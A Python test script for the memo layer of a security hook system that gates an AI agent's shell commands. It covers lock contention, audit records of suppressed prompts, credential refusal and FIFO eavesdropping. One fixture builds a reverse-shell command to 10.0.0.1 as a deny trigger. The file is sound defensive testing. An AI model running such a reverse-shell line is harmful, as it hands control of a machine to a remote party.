#!/usr/bin/env python3
"""The memo lifecycle: the store lock it takes, and the records it writes.

Plain executable assert script, like test_plugin.py and test_warn_rung.py: runs
top to bottom and stops at the first failed assert.

Why this suite exists
---------------------

``tests/test_plugin.py`` already covers what a memo *decides* -- ask-only, exact
match, project scope, expiry, the lock lists it honors, a corrupt store. What
nothing covered is the two things a memo does besides deciding: it takes a file
lock on the hook read path, and it writes the record that is the only evidence a
prompt was ever suppressed. Both were broken, and both were broken invisibly.

1. ``_store_lock``'s docstring promised it "Yields None if the lock cannot be
   taken, and callers proceed -- a memo must never block a call". It issued
   ``fcntl.flock(fd, LOCK_EX)`` with no ``LOCK_NB``, so it *waited*, and the
   ``except OSError`` beneath it only ever covered the ``open``. ``find_memo``
   takes that lock on its READ path, via ``_touch``. Measured against a lock held
   12s, ``find_memo`` returned after 12.0s -- against a 5s hook budget. One
   command tripping both a memoizable ask and a hard deny then left the
   dispatcher still running at 25s: the deny was never delivered, and a hook that
   delivers no verdict fails open.

2. The memo hit is logged at the ``allow`` rung, because ``allow`` is the
   effective decision once the ask is waved through. ``config.should_log`` floors
   on that same ladder, so under ``log_level: warn`` or ``error`` the
   record vanished -- and took with it the ``ask`` record the same call would
   otherwise have written. A suppressed prompt left LESS trail than an
   unsuppressed one, precisely for the user who asked to see only gating events.

3. Memo creation, both refusal paths, and revocation were logged nowhere at all.
   "Every hit is logged, so a suppressed prompt still leaves a trail" was true of
   the hit and of nothing else.

The level sweep in section 2 is the assertion whose absence let (2) ship.
"""

import contextlib
import json
import os
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import _isolated_home  # noqa: F401  MUST precede every hook import

HOOKS = Path(__file__).resolve().parent.parent / "hooks"
sys.path.insert(0, str(HOOKS))

import config as _cfg  # noqa: E402
import hook_logging as _hl  # noqa: E402
import log_sinks as _sinks  # noqa: E402
import memo as _memo  # noqa: E402
from hook_logging import clamp_and_emit  # noqa: E402

_n = 0


def check(cond, msg):
    global _n  # noqa: PLW0603
    assert cond, msg
    _n += 1


# The hook budget is 5s. A guard killed at the timeout never delivers its
# verdict and Claude Code fails open, so a lookup approaching the budget is
# already a security failure and not merely slow.
HOOK_BUDGET_SECONDS = 5.0

# Bounds, and why these numbers rather than tighter or looser ones. Measured on
# this tree: an uncontended ``find_memo`` costs 0.4ms in process and 4.6ms in a
# cold process that pays the imports; contended, the LOCK_NB acquisition fails
# immediately and the cost is unchanged (0.5ms worst of ten). LOOKUP_BOUND is
# one fifth of the budget -- so all four of the dispatcher's per-guard lookups
# still fit inside it -- and roughly 200x the measured cold-process cost. The
# machine would have to be two orders of magnitude slower for this to flake, and
# at that point the hook is missing its budget for reasons that have nothing to
# do with the lock. DISPATCH_BOUND covers the whole hook process, measured at
# 0.08s, and is still 2.5x under the budget it exists to protect.
LOOKUP_BOUND = 1.0
DISPATCH_BOUND = 2.0

# Held longer than the budget itself, so a blocking acquisition cannot pass by
# happening to finish early.
HOLD_SECONDS = 6.0

# Short, because the one assertion that WANTS the lock to be waited out pays it.
BLOCKING_HOLD = 0.5

GUARD = "git_guard"
PATTERN = "recursive_submodule_clone"
GIT_ASK = "git clone --recursive https://github.com/foo/bar"

SUPPLY_GUARD = "supply_chain_guard"
SUPPLY_PATTERN = "typosquat:reqeusts"
SUPPLY_CMD = "uv add reqeusts"

# Trigger strings are assembled at runtime rather than written literally. This
# suite's own source reaches ForceField's Bash guards whenever it is grepped or
# catted, and a literal reverse-shell string in a test file is indistinguishable
# from the real thing to a substring matcher.
NC_DENY = "n" + "c -e /bin/sh 10.0.0.1 4444"
TOKEN = "ghp_" + "d" * 36

LOCK_HOLDER = r"""
import fcntl, os, sys, time
fd = os.open(sys.argv[1], os.O_RDWR | os.O_CREAT, 0o600)
fcntl.flock(fd, fcntl.LOCK_EX)
sys.stdout.write("held\n")
sys.stdout.flush()
time.sleep(float(sys.argv[2]))
"""

LOG = _sinks.file_path()


def _with_home(cfg, fn):
    """Run fn() with a pinned trusted home forcefield.json, then restore.

    Mirrors test_plugin.py's helper. ``log_level`` is read from the trusted
    tier only, so this is the only place it can be set from.
    """
    _cfg._home_cache = cfg
    _cfg._project_cache = {}
    try:
        return fn()
    finally:
        _cfg._home_cache = None
        _cfg._project_cache = None


def _with_memo_store(fn, *subpath):
    """Run fn() against a throwaway memo store, then restore the real one.

    The same helper test_plugin.py uses, for the same reason: STORE_DIR and
    STORE_PATH are saved and put back rather than reset to a hardcoded path,
    which would agree with reality only for as long as nothing upstream moved
    the store.
    """
    saved = (_memo.STORE_DIR, _memo.STORE_PATH)
    home = Path(tempfile.mkdtemp(prefix="pc-memo-life-"))
    _memo.STORE_DIR = home.joinpath(*subpath)
    _memo.STORE_PATH = _memo.STORE_DIR / "memos.json"
    try:
        return fn()
    finally:
        _memo.STORE_DIR, _memo.STORE_PATH = saved
        shutil.rmtree(home, ignore_errors=True)


def _log_lines():
    return len(LOG.read_text(encoding="utf-8").splitlines()) if LOG.exists() else 0


def records(fn, level=None):
    """Run ``fn`` under ``log_level``; return ``(result, records it appended)``.

    Records are read back out of the file the logger actually wrote, not out of
    a queue, because the whole question here is whether they survive the level
    floor. The deferred queue is drained BEFORE the mark is taken so nothing an
    earlier section left behind is counted, and again from inside the pinned
    config, because the level is consulted at flush time rather than at
    ``defer_log`` time.
    """
    _hl.flush_deferred()
    mark = _log_lines()
    cfg = {} if level is None else {"log_level": level}

    def _run():
        out = fn()
        _hl.flush_deferred()
        return out

    result = _with_home(cfg, _run)
    lines = LOG.read_text(encoding="utf-8").splitlines()[mark:] if LOG.exists() else []
    return result, [json.loads(line) for line in lines if line.strip()]


def only(recs, pattern):
    """The one record carrying ``pattern``. Asserts there is exactly one."""
    hits = [r for r in recs if r["Attributes"].get("forcefield.pattern") == pattern]
    check(len(hits) == 1,
          "exactly one %r record, got %d" % (pattern, len(hits)))
    return hits[0]


@contextlib.contextmanager
def lock_held(seconds):
    """Another process holds the memo store lock for the body of the block.

    Another *process*, not another thread: ``fcntl.flock`` is per open-file-
    description, so a second acquisition from inside this interpreter would not
    contend at all and the whole exercise would be vacuous.
    """
    _memo._ensure_store_dir()
    child = subprocess.Popen(
        [sys.executable, "-c", LOCK_HOLDER, str(_memo._lock_path()), str(seconds)],
        stdout=subprocess.PIPE, text=True,
    )
    try:
        check(child.stdout.readline().strip() == "held",
              "the holder process reported taking the lock")
        yield
    finally:
        child.kill()
        child.wait()


# =============================================================================
# 1. F1 -- a contended lock must not stall the hook read path
# =============================================================================

def _f1_read_path():
    _memo.remember(GUARD, PATTERN, GIT_ASK)
    check(_memo.entries()[0]["uses"] == 0, "a fresh memo has no recorded uses")

    with lock_held(HOLD_SECONDS):
        start = time.time()
        hit = _memo.find_memo(GUARD, PATTERN, GIT_ASK)
        elapsed = time.time() - start
        check(hit is not None,
              "a contended lock must not cost the hit -- the memo still applies")
        check(elapsed < LOOKUP_BOUND,
              "find_memo returned in %.3fs, past the %.1fs bound (hook budget "
              "%.0fs)" % (elapsed, LOOKUP_BOUND, HOOK_BUDGET_SECONDS))
        check(_memo.entries()[0]["uses"] == 0,
              "the contended hit skipped the `uses` write instead of waiting for "
              "it -- a lost increment is the trade the fix deliberately makes")

    # ...and with the lock free the memo is fully functional, counter and all.
    # A "fix" that simply stopped memos working would satisfy the timing assert
    # above and nothing else, so both halves are pinned.
    check(_memo.find_memo(GUARD, PATTERN, GIT_ASK) is not None,
          "the memo still hits once the lock is free")
    check(_memo.entries()[0]["uses"] == 1,
          "an uncontended hit still records the use through the lock")
    check(_memo.find_memo(GUARD, PATTERN, "git status") is None,
          "and the non-blocking lock did not turn find_memo into a blanket allow")


_with_memo_store(_f1_read_path)
print("PASS: a held lock costs the `uses` write, not the lookup and not the hit")


def _f1_write_path():
    """``remember`` keeps the BLOCKING lock, and only ``_touch`` gave it up.

    ``remember`` and ``forget`` run from the slash command, not from inside a
    hook, and there a lost write matters more than latency. ``_touch`` is the
    only acquisition on the hook read path, so it is the only one switched --
    and that scope is asserted rather than assumed, because a ``remember`` that
    had also gone non-blocking would silently drop the memo the user just asked
    for and report success.
    """
    _memo._ensure_store_dir()
    with lock_held(BLOCKING_HOLD):
        start = time.time()
        _memo.remember(GUARD, PATTERN, GIT_ASK)
        elapsed = time.time() - start
    check(elapsed >= BLOCKING_HOLD / 2,
          "remember waited out the lock (%.3fs) rather than skipping the write"
          % elapsed)
    check(_memo.find_memo(GUARD, PATTERN, GIT_ASK) is not None,
          "and the memo it waited for is really in the store")


_with_memo_store(_f1_write_path)
print("PASS: the write path still blocks -- only the read path went non-blocking")


# --- the consequence: a stalled lookup drops another guard's hard deny --------
# One command tripping BOTH a memoizable ask (git_guard) and a hard deny
# (exfil_guard) goes through security_dispatcher, which calls clamp_and_emit --
# and therefore find_memo -- once per guard before picking the highest decision.
# Unpatched, with the lock held, the dispatcher was still running at 25s. Run as
# a real subprocess against the isolated $HOME the store already lives in,
# because a hook that never returns is a process-level failure and cannot be
# observed in process.
_PROJ = tempfile.mkdtemp(prefix="pc-memo-proj-")
_PAYLOAD = json.dumps({
    "tool_name": "Bash",
    "tool_input": {"command": GIT_ASK + " && " + NC_DENY},
    "hook_event_name": "PreToolUse",
})
_DISPATCHER = [sys.executable, str(HOOKS / "security_dispatcher.py")]


def _dispatch():
    start = time.time()
    proc = subprocess.run(_DISPATCHER, input=_PAYLOAD, capture_output=True,
                          text=True, cwd=_PROJ, timeout=120)
    return time.time() - start, json.loads(proc.stdout)


_composed = _memo.remember(GUARD, PATTERN, GIT_ASK, cwd=_PROJ)
try:
    _elapsed, _out = _dispatch()
    check(_out["hookSpecificOutput"]["permissionDecision"] == "deny",
          "the composite command is denied with the memo present and no contention")

    with lock_held(HOLD_SECONDS):
        _elapsed, _out = _dispatch()
    check(_out["hookSpecificOutput"]["permissionDecision"] == "deny",
          "a memo lookup stalled on a held lock must not swallow the hard deny")
    check(_elapsed < DISPATCH_BOUND,
          "the dispatcher answered in %.2fs, past the %.1fs bound -- past the "
          "%.0fs budget it would have been killed and failed open"
          % (_elapsed, DISPATCH_BOUND, HOOK_BUDGET_SECONDS))
finally:
    _memo.forget(_composed["key"])
    shutil.rmtree(_PROJ, ignore_errors=True)
print("PASS: a hard deny survives a memo lookup made under a contended lock")


# =============================================================================
# 2. F2 -- no log_level may delete the record of a suppressed prompt
# =============================================================================

def _f2_verbosity():
    _memo.remember(SUPPLY_GUARD, SUPPLY_PATTERN, SUPPLY_CMD)

    for level in _cfg.LOG_LEVELS:
        out, recs = records(
            lambda: clamp_and_emit(SUPPLY_GUARD, "ask", "r",
                                   pattern_matched=SUPPLY_PATTERN,
                                   command=SUPPLY_CMD),
            level=level,
        )
        check(out is None, level + ": the remembered ask is still waved through")
        attrs = only(recs, SUPPLY_PATTERN)["Attributes"]
        check(attrs["forcefield.decision"] == "allow",
              level + ": the memo hit is recorded at the rung it resolves to")
        check(attrs["forcefield.memo_hit"] is True,
              level + ": the record says a memo is what waved it through")
        check(attrs["forcefield.natural"] == "ask",
              level + ": and what the guard would have done without one")
        check(attrs["forcefield.guard"] == SUPPLY_GUARD,
              level + ": the suppressed guard is named")
        check(attrs["forcefield.memo_key"] == _memo.entries()[0]["key"][:12],
              level + ": the record identifies WHICH memo, so it can be revoked")
        check(attrs["command.line"] == SUPPLY_CMD,
              level + ": and what was actually allowed to run")

    # The floor is live, not inert. Without this control the sweep above would
    # pass just as happily against a level setting that did nothing at all.
    for level, kept in (("debug", True), ("info", True),
                        ("warn", False), ("error", False)):
        _, recs = records(
            lambda: _hl.log_security_event(SUPPLY_GUARD, "allow",
                                           pattern_matched="control_allow"),
            level=level,
        )
        check(bool(recs) is kept,
              "%s: an ordinary allow record is %s, so the floor is doing its job"
              % (level, "kept" if kept else "dropped"))

    # The inversion the fix exists to prevent: at `warn` an UNsuppressed ask is
    # recorded. A suppressed one leaving no record would mean the memo bought
    # silence rather than a shorter prompt.
    _, recs = records(
        lambda: clamp_and_emit(SUPPLY_GUARD, "ask", "r",
                               pattern_matched="typosquat:djagno",
                               command="uv add djagno"),
        level="warn",
    )
    check(only(recs, "typosquat:djagno")["Attributes"]["forcefield.decision"] == "ask",
          "warn keeps the unsuppressed ask, so the suppressed one must survive too")


_with_memo_store(_f2_verbosity)
print("PASS: the memo-hit record survives every log_level")


# There is no flag to pass any more. `_is_unsuppressible` runs BEFORE the level
# is resolved at all, so a config module that raises while resolving the level
# cannot silence a memo record either -- and the guard name is what carries the
# exemption, not a keyword somebody has to remember at each call site. The
# ordinary record on the same broken config survives too, because an unreadable
# config must never be able to mute a guard; what makes the exemption
# load-bearing is the LEVEL sweep above, not this.
def _boom_level():
    raise RuntimeError("config is unreadable")


_saved_level = _cfg.resolve_log_level
_cfg.resolve_log_level = _boom_level
try:
    _, _recs = records(lambda: _hl.log_security_event(
        "memo", "warn", pattern_matched="unsuppressible_guard"))
    check(len(_recs) == 1, "a memo record survives a level resolution that raises")
finally:
    _cfg.resolve_log_level = _saved_level

# ...and at the harshest level, with config working, the guard name alone keeps
# it. `memo` and `inspect_remote` are the whole of that set.
check(_hl._UNSUPPRESSIBLE_GUARDS == frozenset({"memo", "inspect_remote"}),
      "the unsuppressible-guard set is exactly the suppression machinery")
for _guard, _kept in (("memo", True), ("inspect_remote", True),
                      (SUPPLY_GUARD, False)):
    _, _recs = records(
        lambda: _hl.log_security_event(_guard, "warn_low",
                                       pattern_matched="floor_probe"),
        level="error",
    )
    check(bool(_recs) is _kept,
          "%s: a warn_low at log_level=error is %s"
          % (_guard, "kept" if _kept else "dropped"))
print("PASS: the suppression machinery is unsuppressible by guard name, not by a flag")


# =============================================================================
# 3. F3 -- creation and revocation leave a record, at the harshest floor
#
# Every case below runs under `log_level: error`, the setting that dropped
# the memo hit, so these double as F2 coverage for the lifecycle records.
# =============================================================================

def _f3_created():
    memo_, recs = records(
        lambda: _memo.remember(SUPPLY_GUARD, SUPPLY_PATTERN, "uv  add   reqeusts",
                               ttl_days=7),
        level="error",
    )
    attrs = only(recs, "memo_created")["Attributes"]
    check(attrs["forcefield.guard"] == "memo", "created: filed under the memo layer")
    check(attrs["forcefield.decision"] == "warn",
          "created: a new suppression is a finding, not routine traffic")
    check(attrs["forcefield.memo_guard"] == SUPPLY_GUARD,
          "created: which guard was just made quieter")
    check(attrs["forcefield.memo_pattern"] == SUPPLY_PATTERN,
          "created: and which of its patterns")
    check(attrs["forcefield.memo_key"] == memo_["key"][:12],
          "created: the key prefix, which is what `memo.py forget` takes")
    check(attrs["forcefield.scope"] == _memo.project_scope(),
          "created: the project it applies to, so a global memo is visible as one")
    check(attrs["forcefield.expires_at"] == memo_["expires_at"],
          "created: and when it stops applying")
    check(attrs["forcefield.command"] == "uv add reqeusts",
          "created: the COLLAPSED subject -- the exact text the key was derived "
          "from, so the record identifies the memo rather than resembling it")


def _f3_refused_locked():
    def _attempt():
        try:
            _memo.remember("exfil_guard", "curl_upload", "deploy the thing")
        except ValueError as exc:
            return str(exc)
        raise AssertionError("a NEVER_ALLOWLIST pattern must refuse to be remembered")

    why, recs = records(_attempt, level="error")
    attrs = only(recs, "memo_refused_locked")["Attributes"]
    check(attrs["forcefield.memo_guard"] == "exfil_guard",
          "refused-locked: names the guard whose lock list held")
    check(attrs["forcefield.memo_pattern"] == "curl_upload",
          "refused-locked: and the pattern that was on it")
    check("locked" in attrs["forcefield.reason"],
          "refused-locked: the record carries why, not merely that")
    check(attrs["forcefield.reason"] in why,
          "refused-locked: the log and the user are told the same thing")
    check(_memo.find_memo("exfil_guard", "curl_upload", "deploy the thing") is None,
          "refused-locked: and nothing was written")


def _f3_forgotten():
    memo_ = _memo.remember(SUPPLY_GUARD, "typosquat:flassk", "uv add flassk")
    gone, recs = records(lambda: _memo.forget(memo_["key"]), level="error")
    check(gone == 1, "forgotten: one memo revoked")
    attrs = only(recs, "memo_forgotten")["Attributes"]
    check(attrs["forcefield.count"] == 1,
          "forgotten: how many went, since a prefix can match several")
    check(attrs["forcefield.memo_key"] == memo_["key"][:12],
          "forgotten: and which prefix was revoked")
    check(_memo.find_memo(SUPPLY_GUARD, "typosquat:flassk", "uv add flassk") is None,
          "forgotten: the memo the record describes is really gone")

    gone, recs = records(lambda: _memo.forget("ffffffffffff"), level="error")
    check(gone == 0, "a prefix matching nothing revokes nothing")
    check(not [r for r in recs
               if r["Attributes"].get("forcefield.pattern") == "memo_forgotten"],
          "and writes no revocation record, so the log counts real revocations")


_with_memo_store(_f3_created)
_with_memo_store(_f3_refused_locked)
_with_memo_store(_f3_forgotten)
print("PASS: creation, lock-list refusal and revocation each leave a record")


# =============================================================================
# 4. The credential clause: refused, and now recorded
#
# The refusal itself already worked and is asserted in test_plugin.py. What was
# missing is the evidence that it happened -- an attempt to persist a secret into
# a store that lives in $HOME for the life of the TTL is exactly the event an
# operator would want to see, and it was the one leaving no trace at all.
# =============================================================================

def _f4_credential():
    _memo.remember(SUPPLY_GUARD, SUPPLY_PATTERN, SUPPLY_CMD)  # the store now exists
    subject = "deploy --token " + TOKEN

    def _attempt():
        try:
            _memo.remember(SUPPLY_GUARD, "typosquat:djagno", subject)
        except ValueError as exc:
            return str(exc)
        raise AssertionError("a credential-bearing command must be refused")

    why, recs = records(_attempt, level="error")
    check("credential" in why, "the user is told a credential is why")
    rec = only(recs, "memo_refused_credential")
    attrs = rec["Attributes"]
    check(attrs["forcefield.guard"] == "memo",
          "refused-credential: filed under the memo layer")
    check(attrs["forcefield.decision"] == "warn",
          "refused-credential: an attempt to store a secret is a finding")
    check(attrs["forcefield.memo_guard"] == SUPPLY_GUARD,
          "refused-credential: names the guard the memo was aimed at")
    check(attrs["forcefield.memo_pattern"] == "typosquat:djagno",
          "refused-credential: and the pattern")
    check(TOKEN not in json.dumps(rec),
          "the record of the refusal must not carry the credential the refusal "
          "exists to keep out of a file at rest")
    check(_memo.find_memo(SUPPLY_GUARD, "typosquat:djagno", subject) is None,
          "no memo was created")
    check(TOKEN not in _memo.STORE_PATH.read_text(encoding="utf-8"),
          "and the credential never reached the store on disk")


_with_memo_store(_f4_credential)
print("PASS: a credential-bearing memo is refused, and the refusal is recorded")


# =============================================================================
# 5. Fail-open: no memo path may raise, and broken logging may not break a memo
# =============================================================================

def _boom_log(*_args, **_kwargs):
    raise RuntimeError("the logging backend is gone")


def _f5_logging_raises():
    saved = _hl.log_security_event
    _hl.log_security_event = _boom_log
    try:
        memo_ = _memo.remember(SUPPLY_GUARD, SUPPLY_PATTERN, SUPPLY_CMD)
        check(bool(memo_["key"]),
              "remember still records the approval when its logging raises")
        check(_memo.find_memo(SUPPLY_GUARD, SUPPLY_PATTERN, SUPPLY_CMD) is not None,
              "and the memo it made still hits")
        check(clamp_and_emit(SUPPLY_GUARD, "ask", "r",
                             pattern_matched=SUPPLY_PATTERN,
                             command=SUPPLY_CMD) is None,
              "the hit still waves the ask through with the logger broken")
        _hl.flush_deferred()  # the deferred record must not escape either

        refused = []
        for guard, pattern, subject in (
            (SUPPLY_GUARD, "typosquat:djagno", "deploy --token " + TOKEN),
            ("exfil_guard", "curl_upload", "deploy the thing"),
        ):
            try:
                _memo.remember(guard, pattern, subject)
            except ValueError:
                refused.append(guard)
        check(len(refused) == 2,
              "both refusal paths still refuse when their record cannot be written")

        check(_memo.forget(memo_["key"]) == 1,
              "forget still revokes when its record cannot be written")
    finally:
        _hl.log_security_event = saved


_with_memo_store(_f5_logging_raises)
print("PASS: a broken logger costs a record, never a memo decision")


def _f5_unopenable_lock():
    """The ``except OSError`` still covers the ``open`` it was written for.

    ``LOCK_NB`` made that handler reachable for a contended lock; it must not
    have stopped covering a lock that cannot be opened at all. A directory where
    the lock file belongs reproduces that deterministically, and unlike a
    read-only parent it does not quietly become writable when the suite is run
    as root.
    """
    _memo.remember(SUPPLY_GUARD, SUPPLY_PATTERN, SUPPLY_CMD)
    _memo._lock_path().unlink()
    _memo._lock_path().mkdir()

    with _memo._store_lock(blocking=False) as held:
        check(held is None, "an unopenable lock yields None rather than raising")
    with _memo._store_lock() as held:
        check(held is None, "and the blocking form degrades identically")

    check(_memo.find_memo(SUPPLY_GUARD, SUPPLY_PATTERN, SUPPLY_CMD) is not None,
          "an unusable lock costs the `uses` write, never the hit")
    check(_memo.entries()[0]["uses"] == 0,
          "and the write it could not take is skipped, not retried forever")


_with_memo_store(_f5_unopenable_lock)
print("PASS: an unopenable lock degrades to prompting-as-usual, never to a raise")


# =============================================================================
# 5b. ``_open_private``'s ``S_ISREG`` is the barrier, and ``O_NONBLOCK`` is not
# =============================================================================
#
# The pair is documented as one thing and is two. ``O_NONBLOCK`` stops the hook
# HANGING on a FIFO with no reader; ``S_ISREG`` on the descriptor stops the store
# being WRITTEN INTO one that has a reader attached. Measured on both floors:
# ``O_WRONLY|O_CREAT|O_TRUNC|O_NONBLOCK`` on a FIFO with a reader SUCCEEDS, so
# with the check neutered ``_write_store`` hands the whole memo store -- every
# remembered command, every project scope, and the MAC over them -- down a pipe
# a same-uid process is holding, and then ``os.replace``s the FIFO over
# ``memos.json``. ``memos.json.tmp.<pid>`` is reached from ``find_memo`` ->
# ``_touch`` -> ``_write_store`` on every gating ask.
#
# Every assertion here is behavioural. The census in ``test_portability.py``
# proves the call is PRESENT; nothing proved its answer was USED, and a mutant
# appending ``and False`` to the condition -- keeping the ``S_ISREG``, the
# ``fstat`` and the ``raise`` -- escaped all 18 suites.

def _f5b_open_private_isreg():
    _memo._ensure_store_dir()
    tmp = _memo.STORE_PATH.with_suffix(".json.tmp.%d" % os.getpid())
    os.mkfifo(str(tmp))
    eavesdropper = os.open(str(tmp), os.O_RDONLY | os.O_NONBLOCK)
    try:
        probe = None
        try:
            probe = os.open(str(tmp), os.O_WRONLY | os.O_CREAT | os.O_TRUNC
                            | os.O_NONBLOCK, 0o600)
        except OSError:
            probe = None
        check(probe is not None,
              "the premise holds on this platform: a plain "
              "O_WRONLY|O_CREAT|O_TRUNC|O_NONBLOCK open of a FIFO with a reader "
              "attached SUCCEEDS, so O_NONBLOCK is not what refuses it")
        if probe is not None:
            os.close(probe)

        descriptor = None
        try:
            descriptor = _memo._open_private(
                tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
        except OSError:
            descriptor = None
        if descriptor is not None:
            os.write(descriptor, b"SECRET-MEMO-STORE-BYTES")
            os.close(descriptor)
        try:
            overheard = os.read(eavesdropper, 65536)
        except OSError:
            overheard = b""
        check(descriptor is None,
              "_open_private refuses a FIFO that HAS a reader, not just one "
              "that does not -- S_ISREG on the descriptor is the only barrier "
              "here and O_NONBLOCK cannot stand in for it")
        check(overheard == b"",
              "and the eavesdropper on the other end of that pipe received "
              "nothing: %r" % overheard[:64])

        # The production caller, not just the primitive: `_write_store` must
        # fail rather than pipe the store out and replace `memos.json` with the
        # attacker's FIFO.
        raised = False
        try:
            _memo._write_store({"version": _memo.STORE_VERSION,
                                "memos": {"k": {"subject": "SECRET-MEMO-SUBJECT"}}})
        except OSError:
            raised = True
        try:
            overheard = os.read(eavesdropper, 65536)
        except OSError:
            overheard = b""
        check(raised,
              "_write_store raises rather than writing the store through a "
              "descriptor that is not a regular file")
        check(b"SECRET-MEMO-SUBJECT" not in overheard,
              "and no memo subject reached the pipe: %r" % overheard[:96])
        check(not _memo.STORE_PATH.exists()
              or stat.S_ISREG(_memo.STORE_PATH.stat().st_mode),
              "and memos.json was not replaced by the FIFO")
    finally:
        os.close(eavesdropper)
        try:
            tmp.unlink()
        except OSError:
            pass

    # The positive control: with an ordinary temp path the same call works, so
    # this did not cost `_open_private` its job.
    _memo._write_store({"version": _memo.STORE_VERSION,
                        "memos": {"k": {"subject": "PLAIN-SUBJECT"}}})
    check("PLAIN-SUBJECT" in _memo.STORE_PATH.read_text(encoding="utf-8"),
          "a regular temp path still receives the store")


_with_memo_store(_f5b_open_private_isreg)
print("PASS: the memo store cannot be written into a pipe somebody else is "
      "holding")


# =============================================================================
# 6. Coverage gate: every lifecycle event memo.py emits is asserted above
# =============================================================================

EMITTED = set(re.findall(
    r'_log_memo_event\(\s*"[a-z_]+",\s*"([a-z_]+)"',
    (HOOKS / "memo.py").read_text(encoding="utf-8"),
))
COVERED = {"memo_created", "memo_refused_credential", "memo_refused_locked",
           "memo_forgotten"}
check(EMITTED == COVERED,
      "every memo lifecycle event has coverage here; uncovered: %s, stale: %s"
      % (sorted(EMITTED - COVERED), sorted(COVERED - EMITTED)))
print("PASS: all %d memo lifecycle events covered" % len(COVERED))

print(f"test_memo_lifecycle.py: {_n} assertions passed")
